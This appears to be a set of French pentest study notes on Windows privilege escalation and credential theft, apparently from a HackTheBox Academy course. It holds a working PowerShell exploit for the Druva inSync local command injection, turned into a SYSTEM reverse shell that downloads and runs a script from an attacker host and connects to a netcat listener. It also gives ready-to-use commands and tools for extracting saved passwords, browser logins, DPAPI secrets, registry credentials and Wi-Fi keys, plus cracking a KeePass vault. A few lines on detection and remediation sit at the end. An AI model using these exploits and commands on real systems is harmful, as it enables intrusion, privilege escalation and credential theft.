Durant un audit, on rencontre souvent de nombreux services sur les postes Windows. Certains peuvent mener à une **élévation en SYSTEM**, d’autres provoquer un **DoS** ou exposer des **informations sensibles** (ex. mots de passe dans des fichiers de config).

## Enumerating Installed Programs

On commence par l’énumération des applications installées :

Commande : `wmic product get name` 

→ L’application **Druva inSync 6.6.3** se distingue : elle est vulnérable à une **injection de commande** via un service RPC exposé (port 6064).  
Druva inSync est un outil de sauvegarde et conformité, dont le service tourne sous le compte **NT AUTHORITY\SYSTEM**.  
Une élévation est donc possible en exploitant ce service local.

## Enumerating Local Ports

Vérifions que le service est bien actif :

Commande : `netstat -ano | findstr 6064`

Exemple de sortie :
```
TCP 127.0.0.1:6064  0.0.0.0:0  LISTENING  3324  
TCP 127.0.0.1:6064  127.0.0.1:50274  ESTABLISHED  3324  
TCP 127.0.0.1:6064  127.0.0.1:50510  TIME_WAIT  0  
```
→ Le port **6064** écoute localement, PID **3324**.

## Enumerating Process ID

Identifions le processus correspondant au PID 3324 :

Commande : `get-process -Id 3324`

## Enumerating Running Service

Confirmons avec PowerShell :

Commande : `get-service | ? {$_.DisplayName -like 'Druva*'}`

→ Le service est actif sous `NT AUTHORITY\SYSTEM`.

## Exploitation – Druva inSync Local Privilege Escalation

Voici un PoC PowerShell permettant d’envoyer une commande au service RPC local sur le port 6064 :

```
$ErrorActionPreference = "Stop"

$cmd = "net user pwnd /add"

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
```

Ce script envoie une commande au service Druva via son interface RPC locale.

## Modification du PoC pour un Reverse Shell

On peut modifier la variable `$cmd` pour exécuter une commande de notre choix.  
Plutôt que d’ajouter un utilisateur local (bruyant), on peut obtenir un reverse shell avec PowerShell.

Télécharger le script **Invoke-PowerShellTcp.ps1** sur la machine d’attaque, le renommer `shell.ps1`, et ajouter à la fin :

`Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.3 -Port 9443`

Modifier ensuite la ligne du PoC :

`$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.3:8080/shell.ps1')"`

## Héberger le Script et Écouter la Connexion

Démarrer un serveur HTTP sur la machine d’attaque :

`python3 -m http.server 8080`

Puis lancer un listener Netcat :

`nc -lvnp 9443`

## Exécution et ÉlÉvation

Sur la cible, modifier la stratégie d’exécution PowerShell :

`Set-ExecutionPolicy Bypass -Scope Process`

Puis exécuter le PoC PowerShell modifié.  
Si tout se passe bien, un shell SYSTEM se connectera à l’attaquant.

## Ressources

- [Druva inSync Command Injection Advisory](https://www.cvedetails.com/cve/CVE-2020-5752/)  
- [PowerShell Reverse Shell – Nishang](https://github.com/samratashok/nishang)  
- [Windows Privilege Escalation Fundamentals – HackTheBox Academy](https://academy.hackthebox.com/)

---

# Credential Hunting

**But :** trouver des identifiants présents sur une machine pour escalade locale, pivot ou récupération de comptes de domaine.  
(Conserve titres et commandes en English, le reste en français.)

## Application Configuration Files
**Description courte :** les applications peuvent stocker des mots de passe en clair dans des fichiers de config (`.config`, `.xml`, `.ini`, etc.). Chercher rapidement via `findstr`.

**Commandes / Process :**
- Rechercher de manière récursive des occurrences de `password` :  
  `findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml`
- Vérifier `web.config` par défaut (IIS) : chercher dans `C:\inetpub\wwwroot\` ou rechercher récursivement.

**Remarque :** note les chemins et fichiers contenant des credentials en clair (username/password, connectionStrings, etc.).

## Dictionary & Browser Files
**Description courte :** des mots sensibles peuvent être présents dans des fichiers dictionnaires ou profils d’applications (ex. Chrome custom dictionary).

**Commandes / Process :**
- Lire le fichier dictionnaire Chrome (exemple) :  
  `gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password`

**Remarque :** fouiller `AppData\Local` / `AppData\Roaming` pour d’autres fichiers texte ou caches.

## Unattended / Answer Files
**Description courte :** fichiers d’installation non supervisée (`unattend.xml`) contiennent souvent `AutoLogon` en clair ou base64.

**Exemple (ce qu’il contient) :** valeur `AutoLogon` → `<Value>local_4dmin_p@ss</Value>` et `<PlainText>true</PlainText>`

**Process :**
- Rechercher `unattend.xml` ou récursive : `findstr /SIM /C:"AutoLogon" *.xml *.unattend`
- Vérifier copies dans images ou dossiers de build.

## PowerShell History (PSReadLine)
**Description courte :** depuis PS 5.0, l’historique des commandes est conservé et peut contenir des credentials passés en ligne de commande.

**Chemin par défaut :** `C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`

**Commandes / Process :**
- Obtenir le path en PowerShell :  
  `(Get-PSReadLineOption).HistorySavePath`
- Lire le fichier courant :  
  `gc (Get-PSReadLineOption).HistorySavePath`
- Lire l’historique pour tous les users accessibles :  
  `foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}`

**Remarque :** chercher dans cet historique des `Set-ExecutionPolicy`, `wevtutil /u /p`, `net use`, `Invoke-WebRequest` contenant des credentials.

## Credentials in Command Lines & Scripts
**Description courte :** beaucoup d’outils acceptent `-u`/`-p` ou `-Password` — ces valeurs peuvent rester en clair dans scripts ou historiques.

**Exemples à rechercher :**
- `wevtutil qe ... /u:DOMAIN\user /p:password`
- `Connect-VIServer -Server 'VC-01' -User 'bob_adm' -Password <pwd>`
- `msiexec /qn /L*V ... PASSWORD=...`

**Process :**
- `findstr /SIM /C:"/u:" /C:"/p:" /C:"-Password" *.*`.

## PowerShell Credentials (Export-Clixml / DPAPI)
**Description courte :** `Get-Credential | Export-Clixml` sauvegarde des credentials chiffrés via DPAPI — récupérables par le même utilisateur sur la même machine.

**Pattern / Process :**
- Localiser les fichiers `*.xml` contenant credentials (ex : `C:\scripts\pass.xml`).  
- Lire et extraire :  
  `Import-Clixml -Path 'C:\scripts\pass.xml'` → `$cred = Import-Clixml -Path 'C:\scripts\pass.xml'`  
  `$cred.GetNetworkCredential().Username`  
  `$cred.GetNetworkCredential().Password`

**Remarque :** si tu as l’accès au compte qui a créé le fichier (ou la clé DPAPI), tu peux déchiffrer.

## DPAPI & User-Specific Encryption
**Description courte :** nombreux secrets (certificats, credentials) sont protégés par DPAPI — déchiffrables par le même user / machine ou via vol des clés DPAPI + master key.

**Process utiles :**
- Rechercher fichiers `*.blob`, `*.xml` dans `AppData\Roaming` ou `ProgramData` qui utilisent DPAPI.  
- Si escalation local disponible, utiliser outils (ex : `mimikatz`, `dpapi` helpers) pour tenter la récupération.

## Quick Generic Searches
- Trouver fichiers texte avec mots-clés courants :  
  `findstr /S /I /M /C:"password" *.*`  
  `findstr /S /I /M /C:"username" *.*`
- Chercher clés `AutoLogon` / `PlainText` dans XML :  
  `findstr /S /I /C:"AutoLogon" *.xml`
- Chercher fichiers `*.xml`, `*.config`, `*.ini` modifiés récemment : trier par date avec `dir /O:-D` ou PowerShell `Get-ChildItem -Recurse | Where-Object { $_.LastWriteTime -gt (Get-Date).AddDays(-30) }`

---

# Other Files

**But :** repérer rapidement d’autres fichiers locaux ou sur partages réseau pouvant contenir des credentials ou infos sensibles (SSH keys, VHD/VMDK, OneNote, Excel, .kdbx, .ppk, etc.).  
(Titres et commandes en anglais, explications en français.)

## Quick crawl of shares
- Utiliser **Snaffler** pour crawler les partages réseau et chercher extensions intéressantes : `.kdbx`, `.vmdk`, `.vhdx`, `.ppk`, `.rdp`, `.ps1`, `.xml`, `.config`, `.sqlite`, etc.
- Commande example (local) : `snaffler -d \\FILESERVER\share -o results.json`  

## Manual file-content searches

- Chercher dans un dossier pour occurrences de `password` :  
  `cd C:\Users\htb-student\Documents & findstr /SI /M "password" *.xml *.ini *.txt`  
- Chercher partout et afficher ligne + numéro :  
  `findstr /spin "password" *.*`  
- PowerShell : rechercher `password` dans tous les `.txt` d’un dossier :  
  `select-string -Path C:\Users\htb-student\Documents\*.txt -Pattern password`  
- Recherche d’extensions par motif (cmd) :  
  `dir /S /B *pass*.txt *pass*.xml *pass*.ini *cred* *.vnc *.config`  
- Recherche récursive d’un type (where) :  
  `where /R C:\ *.config`  
- PowerShell recherche d’extensions (rapide) :  
  `Get-ChildItem C:\ -Recurse -Include *.rdp,*.config,*.vnc,*.cred -ErrorAction Ignore`
  
## Sticky Notes (Windows 10+)

- Emplacement Sticky Notes DB :  
  `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`  
- Lister fichiers associés :  
  `ls C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState`  
- Copier les 3 fichiers `plum.sqlite*` et ouvrir avec DB Browser for SQLite ou utiliser `strings` :  
  `strings plum.sqlite-wal | grep -i vcenter`  
- PowerShell (PSSQLite) pour lire la table Note :  
  `Import-Module .\PSSQLite.psd1`  
  `$db = 'C:\path\to\plum.sqlite'`  
  `Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap`

## Inspect DB and binary files fast

- Utiliser `strings` sur gros fichiers (VHD, VMDK, sqlite, wal, etc.) :  
  `strings file.vhd | grep -i password`  
- Monter un VHD/VHDX localement si possible : `Mount-VHD -Path C:\path\to\disk.vhdx` (PowerShell)  
- Examiner fichiers Office/OneNote for plain text or embedded credentials (export / unzip for .docx/.xlsx).

## Common places & file types to check
- User folders & shares: `C:\Users\<user>\Documents`, `\\FILE01\users\bjones`  
- Browser profiles: `AppData\Local\Google\Chrome\User Data\Default` (custom dictionaries, cookies)  
- VM images: `.vmdk`, `.vhdx`, `.vhd`  
- Backup images and archives: `.zip`, `.7z`, `.tar` sur shares  
- Password managers / databases: `.kdbx` (KeePass)  
- SSH keys: `id_rsa`, `*.ppk`  
- RDP files: `*.rdp` (contiennent parfois username)  
- PowerShell scripts: `*.ps1` (rechercher `-Password`, `-Credential`)  
- Unattend / answer files: `unattend.xml` (AutoLogon value)  
- StickyNotes DB: `plum.sqlite*` (voir plus haut)  
- Temp & browser cache: `%USERPROFILE%\Local Settings\Temp`, `Content.IE5`, `AppData\Local\Temp`  
- System artifacts: `%SYSTEMDRIVE%\pagefile.sys`, `%WINDIR%\repair\*`, `%USERPROFILE%\ntuser.dat`

## Searching shares at scale
- Exporter liste fichiers puis greper localement (si accès SMB) :  
  `robocopy \\FILE01\users C:\temp\listing /L /S` (simulate) puis greps.  
- Copier uniquement extensions intéressantes pour analyse off-box : privilégier `rsync`/`robocopy` filtrés.

## Examples: extract credential-like strings

- findstr for common patterns:  
  `findstr /spin /C:"password" /C:"pwd" /C:"passwd" *.*`  
- Grep-like in PowerShell:  
  `Get-ChildItem -Recurse -Include *.txt,*.config,*.xml | Select-String -Pattern "password|pwd|passwd" | ft Path,LineNumber,Line`

## Post-discovery actions
- Tester cred trouvés localement : `net user <user> <pass>` (vérifier) ou `runas /user:DOMAIN\user "cmd.exe"`  
- Tester clés SSH/PPK : `ssh -i id_rsa user@host` ; convertir PPK → OpenSSH si besoin.  
- Si image montée contient SAM/System, extraire hashs via `impacket-secretsdump` ou `samparse` (en labo uniquement).


## Tool
- [Snaffler — crawl shares for secrets](https://github.com/SnaffCon/Snaffler)  

---

# Further Credential Theft – Cheat Sheet

**But :** récupérer des credentials déjà enregistrés ou cachés sur le système Windows (navigateurs, registres, Wi-Fi, outils RDP, password managers, etc.).

---

## Cmdkey Saved Credentials
**Description courte :** les utilisateurs peuvent stocker des credentials pour RDP, SMB, ou autres connexions via `cmdkey`.

**Lister les credentials sauvegardés :**
`cmdkey /list`

**Exemple de sortie :**
Target: LegacyGeneric:target=TERMSRV/SQL01  
User: inlanefreight\bob  

**Réutiliser le credential :**
`runas /savecred /user:inlanefreight\bob "COMMAND_HERE"`

---

## Browser Credentials
**Description courte :** Chrome et autres navigateurs Chromium stockent les mots de passe dans `Login Data` (SQLite).  
Utiliser **SharpChrome** pour les extraire et déchiffrer.

**Commande :**
`.\SharpChrome.exe logins /unprotect`

**Sortie typique :**
`username: bob@inlanefreight.local`  
`password: Welcome1`

**Note défensive :**
Détection possible via événements 4688 (process creation), 16385 (DPAPI), 4662/4663 (file/object access).

---

## Password Managers
**Description courte :** fichiers `.kdbx` (KeePass), `.opvault`, `.1pif`, ou vaults d’entreprise (Thycotic, CyberArk) peuvent contenir des credentials critiques.

**Extraction de hash KeePass :**
`python2.7 keepass2john.py vault.kdbx > keepass_hash.txt`

**Cracking du hash :**
`hashcat -m 13400 keepass_hash.txt rockyou.txt`

**Si succès :** accès complet au vault → escalade majeure.

---

## Email Search (MailSniper)
**Description courte :** chercher des credentials dans les boîtes Exchange locales avec **MailSniper**.

**Exemple :**
- Connecter via OWA ou EWS.
- Rechercher : `"pass OR creds OR credentials"`

---

## LaZagne
**Description courte :** outil multi-modules pour extraire les credentials en clair de nombreuses applis (navigateurs, mails, bases, Wi-Fi, DPAPI, Credman, etc.).

**Lister les modules :**
`.\lazagne.exe -h`

**Exécution complète :**
`.\lazagne.exe all`

**Exemple de résultats :**
- WinSCP → `root / Summer2020!`
- Credman → `jordan_adm / !QAZzaq1`

**Option utile :**
`-v` pour plus de détails  
`-oN creds.txt` pour sortie fichier

---

## SessionGopher
**Description courte :** PowerShell script pour extraire credentials de PuTTY, WinSCP, FileZilla, SuperPuTTY, RDP, RSA, etc.  
Cherche et déchiffre infos stockées dans HKEY_USERS.

**Exécution :**
`Import-Module .\SessionGopher.ps1`  
`Invoke-SessionGopher -Target localhost`

**Résultats possibles :**
- Hostnames, usernames, passwords, sessions RDP/SSH stockées.

**Remarque :**
Besoin de privilèges admin pour interroger toutes les hives utilisateurs.

---

## Registry Stored Credentials

### Windows AutoLogon
**Description courte :** stockage en clair du mot de passe utilisé pour auto-login Windows.

**Chemin clé :**
`HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

**Commande :**
`reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"`

**Champs intéressants :**
- `AutoAdminLogon`
- `DefaultUserName`
- `DefaultPassword`

**Exemple :**
`DefaultPassword    REG_SZ    HTB_@cademy_stdnt!`

---

### PuTTY Proxy Credentials
**Description courte :** les sessions PuTTY avec proxy stockent les credentials en clair dans le registre.

**Chemin clé :**
`HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\<SESSION_NAME>`

**Lister les sessions :**
`reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions`

**Examiner une session :**
`reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh`

**Exemple :**
`ProxyUsername    REG_SZ    administrator`  
`ProxyPassword    REG_SZ    1_4m_th3_@cademy_4dm1n!`

---

## Wi-Fi Credentials
**Description courte :** Windows sauvegarde les profils Wi-Fi et leurs clés.  
Peut permettre un accès réseau supplémentaire.

**Lister les réseaux connus :**
`netsh wlan show profile`

**Afficher un mot de passe Wi-Fi :**
`netsh wlan show profile <SSID> key=clear`

**Exemple de sortie :**
`Key Content : ILFREIGHTWIFI-CORP123908!`

---

## Résumé – Offensive Steps
1. `cmdkey /list` → reuse creds via `runas /savecred`  
2. `SharpChrome` → extraire logins browser  
3. `LaZagne all` → cred en clair multi-apps  
4. `SessionGopher` → creds RDP/SSH/FileZilla  
5. `keepass2john + hashcat` → crack vault KeePass  
6. `reg query Winlogon` → Autologon password  
7. `reg query PuTTY` → Proxy credentials  
8. `netsh wlan show profile key=clear` → Wi-Fi key  

---

## Remédiations rapides
- Désactiver `AutoAdminLogon`.  
- Supprimer credentials `cmdkey` après usage : `cmdkey /delete:<target>`.  
- Chiffrer ou restreindre accès au registre utilisateur.  
- Utiliser gestionnaire de mots de passe avec chiffrement fort.  
- Interdire stockage de passwords en clair dans scripts ou outils RDP.  
- Surveiller exécutions de `lazagne`, `SharpChrome`, `hashcat`, `cmdkey`, `reg.exe` pour détection.

---

## Outils recommandés
- [SharpChrome – dump Chrome creds](https://github.com/GhostPack/SharpDPAPI) 
- [LaZagne – récupération multi-sources](https://github.com/AlessandroZ/LaZagne)  
- [SessionGopher – RDP / SSH creds](https://github.com/Arvanaghi/SessionGopher) 
- [MailSniper – recherche mails Exchange](https://github.com/dafthack/MailSniper)   





























